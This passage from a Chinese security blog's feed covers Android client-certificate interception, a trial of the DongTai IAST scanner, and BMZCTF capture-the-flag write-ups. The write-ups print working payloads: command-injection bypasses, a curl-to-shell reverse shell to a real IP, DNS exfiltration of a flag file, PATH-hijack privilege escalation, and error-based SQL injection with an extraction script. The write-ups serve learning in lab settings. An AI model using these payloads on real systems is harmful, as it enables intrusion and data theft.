class="line-numbers-rows"><span></span></span></code></pre><p>再利用key和证书生成p12证书，可以导入burp的那种，密码是我们上面设置的12345678。</p><pre class="line-numbers language-none"><code class="language-none">openssl pkcs12 -export -clcerts -in client-cert.cer -inkey client-key.key -out client.p12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当没有配置证书的时候，抓包显示Communication error。配置进行这个p12。密码为12345678</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622104.png" alt="image-20211217134216895"></p><p>再次访问即可成功。</p><h4 id="frida-2"><a href="#frida-2" class="headerlink" title="frida(2)"></a>frida(2)</h4><p>如果能获取证书，但是需要查找密码，而又懒得去解包或者不好脱壳，可以尝试查密码的frida脚本。</p><p>frida js ：<a href="https://raw.githubusercontent.com/m0bilesecurity/Frida-Mobile-Scripts/master/Android/tracer_keystore.js">https://raw.githubusercontent.com/m0bilesecurity/Frida-Mobile-Scripts/master/Android/tracer_keystore.js</a></p><p>使用上面的python2脚本来调用。</p><pre class="line-numbers language-none"><code class="language-none">python .\frida_attach.py .\tracer_keystore.js httpstest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击触发功能，会显示如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622105.png" alt="image-20211217134908128"></p><p>由于可以解包获取其中的p12证书，所以直接导入证书和密码到burp即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h3&gt;&lt;p&gt;源码来自：&lt;a href=&quot;https://github.com/Ch3nYe/httpstest&quot;&gt;https://github.com/
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>洞态IAST初使用</title>
    <link href="https://misakikata.github.io/2021/12/%E6%B4%9E%E6%80%81IAST%E5%88%9D%E4%BD%BF%E7%94%A8/"/>
    <id>https://misakikata.github.io/2021/12/洞态IAST初使用/</id>
    <published>2021-12-09T03:10:04.000Z</published>
    <updated>2021-12-09T03:15:38.506Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>按照官方文档，<a href="https://doc.dongtai.io/02_start/index.html">https://doc.dongtai.io/02_start/index.html</a></p><p>使用docker来安装，直接执行</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai.gitcd deploy&#x2F;docker-compose&#x2F;.&#x2F;dtctl install -v 1.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不过这个创建docker有一个问题就是，openapi的端口没有被开启，修改dtctl，给openapi添加端口。这个端口的开启在1.0.5中，需要自己去填写openapi。</p><pre class="line-numbers language-none"><code class="language-none">dongtai-openapi:    image: &quot;dongtai.docker.scarf.sh&#x2F;dongtai&#x2F;dongtai-openapi:$CHANGE_THIS_VERSION&quot;    restart: always    ports:       - &quot;8000:8000&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115139.png" alt="image-20211208141900279"></p><p>使用账号密码admin/admin登陆，查看状态监控，基本就是如下显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115140.png" alt="image-20211208155958875"></p><h3 id="初测试"><a href="#初测试" class="headerlink" title="初测试"></a>初测试</h3><p>下载agent，此处使用IDEA来配置，在启动参数中添加，此处使用一个Spring的项目Ruoyi4.6版本。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115141.png" alt="image-20211208160954655"></p><p>洞态这边会显示一个agent：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115142.png" alt="image-20211208161019830"></p><p>我们在ruoyi的后台点点点</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115143.png" alt="image-20211208161723992"></p><p>在洞态那边可以看到已经有一堆数据过来了</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115144.png" alt="image-20211208161757676"></p><p>旁边还存在依赖检测</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115145.png" alt="image-20211208162407807"></p><p>只不过这个检测注入有点问题，比如上面检测到pageSize存在问题，我们跟随调试一下。进行到如下代码，此处意思是获取参数名。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115146.png" alt="image-20211208172131061"></p><p>这里获取参数中排序的参数值此处是传输的asc</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115147.png" alt="image-20211208172203836"></p><p>下面的getPageSize是获取参数PageSize，但是这个函数返回类型是Integer。所以当传输一些字符返回的是null。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115148.png" alt="image-20211208172329146"></p><p>num和size不为null的时候，这里getOrderBy把参数orderByColumn和isAsc进行了拼接，escapeOrderBySql把参数值进行了一次判断，正则匹配字母数字和下划线，逗号，点。如果想靠这两个参数拼接也不行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115149.png" alt="image-20211208183537516"></p><p>这个版本存在一个注入，而这个注入跟这个参数其实没啥关系，ruoyi使用了mybatis，上面这个功能点确实是存在问题，查看sql的目录文件SysRoleMapper.xml。</p><p>找到id为selectRoleList，下面就可以看到了，其实是用了$来传参。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115151.png" alt="image-20211208183920487"></p><p>但是这个参数并不能直接利用，因为这个参数不在上面这个请求里。需要手动添加一下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115152.png" alt="image-20211208184326669"></p><p>这个功能上确实是存在注入问题，但是检测没有找准参数，这个点也许是由于这个参数不存在的原因，导致检测存在一些偏差。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;按照官方文档，&lt;a href=&quot;https://doc.dongtai.io/02_start/index.html&quot;&gt;https://do
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BMZCTF做题记录</title>
    <link href="https://misakikata.github.io/2021/10/BMZCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://misakikata.github.io/2021/10/BMZCTF做题记录/</id>
    <published>2021-10-19T03:00:14.000Z</published>
    <updated>2021-10-19T03:02:35.695Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端午就该吃粽子"><a href="#端午就该吃粽子" class="headerlink" title="端午就该吃粽子"></a>端午就该吃粽子</h2><p>访问login.php，会给一个这样的链接<a href="http://www.bmzclub.cn:22937/login.php?zhongzi=show.php">http://www.bmzclub.cn:22937/login.php?zhongzi=show.php</a></p><p>看样子是文件读取的漏洞，尝试读取一个passwd文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922170259145.png" alt="image-20210922170259145"></p><p>可以直接读取，再去试试根目录下的flag文件，提示你是偷粽子的。从匹配上看是只要存在flag这个词就不行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922170335891.png" alt="image-20210922170335891"></p><p>尝试利用远程包含，屏蔽了http关键词。file没有屏蔽，但是不能读取flag。那就尝试一下伪协议。</p><p>php://input不给用，都会报错。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922171943816.png" alt="image-20210922171943816"></p><p>尝试读取的命令php://filter</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;show.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922172127683.png" alt="image-20210922172127683"></p><p>解编码后发现是页面的HTML源码。里面注释了index.php。读取发现是如下php代码</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922172304376.png" alt="image-20210922172304376"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);if (isset($_GET[&#39;url&#39;])) &#123;  $ip&#x3D;$_GET[&#39;url&#39;];  if(preg_match(&quot;&#x2F;(;|&#39;| |&gt;|]|&amp;| |python|sh|nc|tac|rev|more|tailf|index|php|head|nl|sort|less|cat|ruby|perl|bash|rm|cp|mv|\*)&#x2F;i&quot;, $ip))&#123;      die(&quot;&lt;script language&#x3D;&#39;javascript&#39; type&#x3D;&#39;text&#x2F;javascript&#39;&gt;      alert(&#39;no no no!&#39;)      window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);  &#125;else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;      die(&quot;&lt;script language&#x3D;&#39;javascript&#39; type&#x3D;&#39;text&#x2F;javascript&#39;&gt;      alert(&#39;no flag!&#39;)      window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);  &#125;  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);  echo $a;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中可以看到的是，基本过滤了文件读取的命令和常见反弹shell的方式，然后还不准同时出现flag这四个字符。</p><p>上面过滤的命令中，恰好有一个tail没有过滤，也就是使用这个来读取flag。</p><p>尝试先执行个命令看看</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922173502404.png" alt="image-20210922173502404"></p><p>然后tail去读文件，但是空格被禁用了，fuzz一下发现可以使用%09，但是还有flag不能用。这个可以使用通配符来绕过读取，最后就是</p><pre class="line-numbers language-none"><code class="language-none">index.php?url&#x3D;127.0.0.1||tail%09&#x2F;fla?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922173801969.png" alt="image-20210922173801969"></p><h2 id="hitcon-2017-ssrfme"><a href="#hitcon-2017-ssrfme" class="headerlink" title="hitcon_2017_ssrfme"></a>hitcon_2017_ssrfme</h2><p>访问给出的地址，首页是一段PHP代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php     $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);     @mkdir($sandbox);     @chdir($sandbox); ​    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);     $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));     @mkdir($dir);     @chdir($dir);     @file_put_contents(basename($info[&quot;basename&quot;]), $data);     highlight_file(__FILE__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看代码是使用IP地址来生成一个目录，这个目录我们可以根据自己的出口IP来确认，然后使用shell_exec来执行命令。使用传入的文件名参数进行创建目录，如果存在目录则去掉点，应该是防止目标遍历，最后生成文件名的文件，写入shell_exec执行的结果。</p><p>一开始还以为是需要执行命令来看，先来看看大概的执行结果，发现写入的是首页。才想起来这是个SSRF的题。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&amp;filename&#x3D;123.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试利用file协议来读取flag</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;file:&#x2F;&#x2F;&#x2F;flag&amp;filename&#x3D;123.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用orange和IP生成md5，到指定目录下查看文件</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sandbox&#x2F;8c2xxx9c5&#x2F;123.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924101620908.png" alt="image-20210924101620908"></p><h2 id="n1ctf-hard-php"><a href="#n1ctf-hard-php" class="headerlink" title="n1ctf/hard_php"></a>n1ctf/hard_php</h2><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924141002836.png" alt="image-20210924141002836"></p><p>一个登陆页面，按照惯例查看是否使用是文件包含读取，修改login为index，发现有登陆验证跳转，修改为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924141101145.png" alt="image-20210924141101145"></p><p>尝试去读取flag</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924141120638.png" alt="image-20210924141120638"></p><h2 id="WEB-penetration"><a href="#WEB-penetration" class="headerlink" title="WEB_penetration"></a>WEB_penetration</h2><p>这个题目稍微有点奇怪，一直在报错，不确定是不是程序问题。代码为：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;ip&#39;]))&#123;    $ip &#x3D; $_GET[&#39;ip&#39;];    $_&#x3D;array(&#39;b&#39;,&#39;d&#39;,&#39;e&#39;,&#39;-&#39;,&#39;q&#39;,&#39;f&#39;,&#39;g&#39;,&#39;i&#39;,&#39;p&#39;,&#39;j&#39;,&#39;+&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;\&lt;&#39;,&#39;\&gt;&#39;,&#39;o&#39;,&#39;w&#39;,&#39;x&#39;,&#39;\~&#39;,&#39;\:&#39;,&#39;\^&#39;,&#39;\@&#39;,&#39;\&amp;&#39;,&#39;\&#39;&#39;,&#39;\%&#39;,&#39;\&quot;&#39;,&#39;\*&#39;,&#39;\(&#39;,&#39;\)&#39;,&#39;\!&#39;,&#39;\&#x3D;&#39;,&#39;\.&#39;,&#39;\[&#39;,&#39;\]&#39;,&#39;\&#125;&#39;,&#39;\&#123;&#39;,&#39;\_&#39;);    $blacklist &#x3D; array_merge($_);    foreach ($blacklist as $blacklisted) &#123;        if (strlen($ip) &lt;&#x3D; 18)&#123;            if (preg_match (&#39;&#x2F;&#39; . $blacklisted . &#39;&#x2F;im&#39;, $ip)) &#123;                die(&#39;nonono&#39;);            &#125;else&#123;            exec($ip);            &#125;                    &#125;        else&#123;        die(&quot;long&quot;);        &#125;    &#125;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个代码看起来是屏蔽了很多关键词，实际上是一个词匹配去查一次，也就是总共进行很多次匹配，有一次符合最后则返回nonono。那么也就是只需要第一次绕过这个过滤就算后面匹配到，命令依然执行了，所以限制只有长度不超过十八即可。但是结果并不会显示，所以我们需要进行一定的外带的办法。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?ip&#x3D;ls+&#x2F;&gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924152835470.png" alt="image-20210924152835470"></p><p>flag并不在根目录，查看其他目录。没有发现其他可读目录下存在，那可能在root目录，需要一定的提权方式，这种读写的办法就不太适用了。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924154101831.png" alt="image-20210924154101831"></p><p>想办法反弹一个shell出来，由于长度限制，此处不直接使用IP，转为十进制IP。利用如下</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n51" mdtype="fences">/?ip=curl+1093xxx907|sh<br/><br/>web服务使用flask搭建，写一个简单的返回。<br/>@app.route(&#39;/&#39;)<br/>def hello_world():<br/>    return &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/65.49.209.99/8888 0&gt;&amp;1&#34;&#39;</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924155033081.png" alt="image-20210924155033081"></p><p>查找有没有可用的SUID</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n54" mdtype="fences">find / -perm -u=s -type f 2&gt;/dev/null</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924155231086.png" alt="image-20210924155231086"></p><p>其中有一个奇怪的love程序，执行后类似是PS的查看进程的结果。所以可能需要劫持PS命令来提取。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n57" mdtype="fences">cd /tmp<br/>echo &#34;/bin/bash&#34; &gt; ps<br/>chmod 777 ps<br/>echo $PATH<br/>export PATH=/tmp:$PATH</pre><p>再去执行love，即可调用当前tmp目录下的ps命令，获取到一个root的shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924160909016.png" alt="image-20210924160909016"></p><p>其中demo.c应该就是love的源代码</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n61" mdtype="fences"># cat demo.c<br/><br/>#include&lt;unistd.h&gt;<br/>void main()<br/>{<br/>        setuid(0);<br/>        setgid(0);<br/>        system(&#34;ps&#34;);<br/>}</pre><h2 id="流量监控平台"><a href="#流量监控平台" class="headerlink" title="流量监控平台"></a>流量监控平台</h2><p>WEb界面需要登陆，账号admin/123456登陆。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100053004.png" alt="image-20210926100053004"></p><p>可以执行命令，看样子是绕过命令执行。由于不回显，所以使用DNS外带的方式。先测试一下可能使用的命令，发现常用的命令不能使用，比如ping,curl等会报错，采用单引号分隔绕过黑名单。还在报错，测试发现是拦截了空格。使用%09绕过。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n66" mdtype="fences">ord=ls;pi&#39;&#39;ng%09byvdxx.dnslog.cn</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100226721.png" alt="image-20210926100226721"></p><p>发现可行，然后使用ceye的监听平台</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n69" mdtype="fences">ord=ls;pi&#39;&#39;ng%09`whoami`.xxxxb4.ceye.io</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100350410.png" alt="image-20210926100350410"></p><p>查看flag</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n72" mdtype="fences">ord=ls;pi&#39;&#39;ng%09`cat%09/flag`.r9rub4.ceye.io</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100456158.png" alt="image-20210926100456158"></p><h2 id="rctf2015-easysql"><a href="#rctf2015-easysql" class="headerlink" title="rctf2015_easysql"></a>rctf2015_easysql</h2><p>打开是一个注册登陆页面，需要先注册个账号登陆，里面就是一些有的没得功能，还有一个修改密码。既然是注入，那就先把注册登陆看看有没有注入点，但是在注册的时候有过滤。</p><p>按照惯例，可能是二次注入，注册一个存在问题的用户名，然后在后续调用的时候触发注入，后续调用明显就是修改密码，这里只传输密码，那可能就是从session获取用户名。先去看看怎么构造能报错啥的。</p><p>从过滤上看and,or,空格等都被过滤掉了。有几个是注册成功的先去查看一下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926161421706.png" alt="image-20210926161421706"></p><p>登陆<code>admin%22%2f%2a</code>的时候，去修改密码功能，发现报错</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926161510472.png" alt="image-20210926161510472"></p><p>从报错上看SQL语句大概是</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n82" mdtype="fences">update user set pwd=&#34;xxxx&#34; where username=&#34;admin&#34;/*&#34; and pwd=&#39;698d51a19d8a121ce581499d7b701668&#39;;</pre><p>构造一个报错语句</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n84" mdtype="fences">username=1&#34;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#</pre><p>但是上面这个语句并不能使用，其中有空格和and符，修改为如下：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n86" mdtype="fences">username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0buser()),0x7e),1))#</pre><p>登陆再去修改密码，发现可以正常执行，那就查库查表查字段一条龙服务。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926162235294.png" alt="image-20210926162235294"></p><p>当前库web_sqli</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n90" mdtype="fences">username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0bdatabase()),0x7e),1))#</pre><p>查看库内的表，正好第一次就是flag表</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n92" mdtype="fences">username=1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(table_name),0x7e)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#39;web_sqli&#39;%0blimit%0b1,1),1))#</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926163153625.png" alt="image-20210926163153625"></p><p>查看字段，就存在一个flag字段</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n95" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;flag&#39;%0blimit%0b0,1),1))#</pre><p>查看字段值，显示<code>RCTF&#123;Good job! But flag not her</code>，啊这。。。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n97" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,flag,0x7e)from%0bflag%0blimit%0b0,1)%0b,1))#</pre><p>懂了，那个flag表是骗人的。再查询一遍还有article表和users表，用users表来查找。终于在字段中查到一个<code>real_flag_1s_here</code></p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n99" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;users&#39;%0blimit%0b3,1),1))#</pre><p>再来查看字段值，limit查看都是一个个xxx，直接聚合输出</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n101" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(select%0bgroup_concat(real_flag_1s_here)from%0busers),0x7e))%0b,1))#</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926165906689.png" alt="image-20210926165906689"></p><p>啊这。。。好家伙，不够长的。。。那就还是一个个输出，先用Intruder批量注册。然后用下面的脚本查看。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n104" mdtype="fences">#coding:utf-8<br/><br/>import requests<br/>import re<br/><br/>headers = {<br/>    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,<br/>    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#39;,<br/>    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;,<br/>    &#39;Referer&#39;: &#39;http://www.bmzclub.cn:22937/changepwd.php&#39;,<br/>    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,<br/>    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9,en;q=0.8&#39;,<br/>    &#39;Cookie&#39;: &#39;Hm_lvt_d7a3b863d5a302676afbe86b11339abd=1631932461,1632274696,1632620435; session=5424329c-1b2e-4349-b4e1-0d2f55c408c5; PHPSESSID=1h1clgvbkvn31qbng29c0m8mr6; Hm_lpvt_d7a3b863d5a302676afbe86b11339abd=1632637433; td_cookie=468906102&#39;<br/>}<br/><br/>for i in range(1, 21):<br/>    data = &#39;username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0breal_flag_1s_here%0bfrom%0busers%0blimit%0b{id},1),0x7e),1))#&amp;password=111&#39;.format(id=str(i))<br/>    r = requests.post(&#39;http://www.bmzclub.cn:22937/login.php&#39;, headers=headers, data=data)<br/>    <br/>    r = requests.post(&#39;http://www.bmzclub.cn:22937/changepwd.php&#39;, headers=headers, data=&#34;oldpass=111&amp;newpass=111&#34;)<br/>    print(re.findall(&#39;XPATH syntax error: (.*)&#39;, r.text))<br/></pre><p>结果全是<code>xxx</code>，啊这，给孩子整不会了。这难道就是0 Solver的原因？</p><h2 id="TCTF2019-Wallbreaker-Easy"><a href="#TCTF2019-Wallbreaker-Easy" class="headerlink" title="TCTF2019_Wallbreaker_Easy"></a>TCTF2019_Wallbreaker_Easy</h2><p>提示如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210927105315721.png" alt="image-20210927105315721"></p><p>蚁剑连接页面，这个是需要绕过disable_functions，phpinfo里紧了一堆函数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210927105350495.png" alt="image-20210927105350495"></p><p>既然是7.2的PHP，那就蚁剑php7-backtrace-bypass一把嗖。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210927105430695.png" alt="image-20210927105430695"></p><h2 id="insomniteaser-2019-l33t-hoster"><a href="#insomniteaser-2019-l33t-hoster" class="headerlink" title="insomniteaser_2019_l33t_hoster"></a>insomniteaser_2019_l33t_hoster</h2><p>此问题并没有正确解出，本来使用大小写后缀外加图片马来绕过限制，但是发现并不会当作php执行。所以此处使用WP复现</p><p>首先是代码</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n116" mdtype="fences">$disallowed_ext = array(<br/>    &#34;php&#34;,<br/>    &#34;php3&#34;,<br/>    &#34;php4&#34;,<br/>    &#34;php5&#34;,<br/>    &#34;php7&#34;,<br/>    &#34;pht&#34;,<br/>    &#34;phtm&#34;,<br/>    &#34;phtml&#34;,<br/>    &#34;phar&#34;,<br/>    &#34;phps&#34;,<br/>);<br/><br/><br/>if (isset($_POST[&#34;upload&#34;])) {<br/>    if ($_FILES[&#39;image&#39;][&#39;error&#39;] !== UPLOAD_ERR_OK) {<br/>        die(&#34;yuuuge fail&#34;);<br/>    }<br/><br/>    $tmp_name = $_FILES[&#34;image&#34;][&#34;tmp_name&#34;];<br/>    $name = $_FILES[&#34;image&#34;][&#34;name&#34;];<br/>    $parts = explode(&#34;.&#34;, $name);<br/>    $ext = array_pop($parts);<br/><br/>    if (empty($parts[0])) {<br/>        array_shift($parts);<br/>    }<br/><br/>    if (count($parts) === 0) {<br/>        die(&#34;lol filename is empty&#34;);<br/>    }<br/><br/>    if (in_array($ext, $disallowed_ext, TRUE)) {<br/>        die(&#34;lol nice try, but im not stupid dude...&#34;);<br/>    }<br/><br/>    $image = file_get_contents($tmp_name);<br/>    if (mb_strpos($image, &#34;&lt;?&#34;) !== FALSE) {<br/>        die(&#34;why would you need php in a pic.....&#34;);<br/>    }<br/><br/>    if (!exif_imagetype($tmp_name)) {<br/>        die(&#34;not an image.&#34;);<br/>    }<br/><br/>    $image_size = getimagesize($tmp_name);<br/>    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {<br/>        die(&#34;lol noob, your pic is not l33t enough&#34;);<br/>    }<br/><br/>    $name = implode(&#34;.&#34;, $parts);<br/>    move_uploaded_file($tmp_name, $userdir . $name . &#34;.&#34; . $ext);<br/>}</pre><p>黑名单限制文件后缀，本来看到in_array中带了true，还以为是大小写绕过。实际是使用htaccess文件来定义文件解析类型。</p><p>上传.htaccess文件。此处由于会对文件名做处理，所以需要使用..htaccess文件来绕过执行，使得能正确保存文件。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n119" mdtype="fences">    $parts = explode(&#34;.&#34;, $name);    #Array([0] =&gt;  [1] =&gt;  [2] =&gt; htaccess)<br/>    $ext = array_pop($parts);        #htaccess<br/><br/>    if (empty($parts[0])) {          #true<br/>        array_shift($parts);          #返回删除的&#39;&#39;，还剩$parts[1] =&gt; &#39;&#39;<br/>    }<br/><br/>    if (count($parts) === 0) {        #false  count=1<br/>        die(&#34;lol filename is empty&#34;);<br/>    }<br/>    .....<br/>    $name = implode(&#34;.&#34;, $parts);     #返回空，所以后续拼接的时候就是$userdir . &#34;.&#34; . $ext<br/></pre><p>剩下的就是图片大小的问题，WP采用的图片格式为XBM格式，一种纯文本二进制图像格式，用于存储X 